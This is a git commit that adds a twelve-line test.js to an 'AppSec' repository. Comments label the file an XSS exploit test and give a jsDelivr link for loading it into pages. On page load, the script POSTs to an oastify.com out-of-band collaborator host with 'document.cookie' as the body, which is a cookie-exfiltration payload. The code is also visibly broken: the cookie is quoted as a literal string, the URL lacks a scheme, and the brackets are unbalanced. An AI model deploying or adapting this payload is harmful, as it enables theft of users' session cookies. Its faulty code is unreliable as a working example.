a9df7abc57828bb11ef05afb410d084f24f131c5
Ivan Vernichenko <97676790+IvanVernichenkoDevPro@users.noreply.github.com>
2023-02-17 18:01:37 +0100

    Create test.js

---
+++ test.js
@@ -0,0 +1,12 @@
+// this is a test for XSS exploit
+// access link is : 
+// https://cdn.jsdelivr.net/gh/user/repo@version/file
+// https://cdn.jsdelivr.net/gh/IvanVernichenkoDevPro/AppSec@main/test.js
+
+document.onload = (event) => { 
+	fetch('66ao3lommh8o2llqdjzjbw3w4naeydm2.oastify.com',
+ 	{
+		method : "POST",
+		body: "document.cookie"
+	};
+}
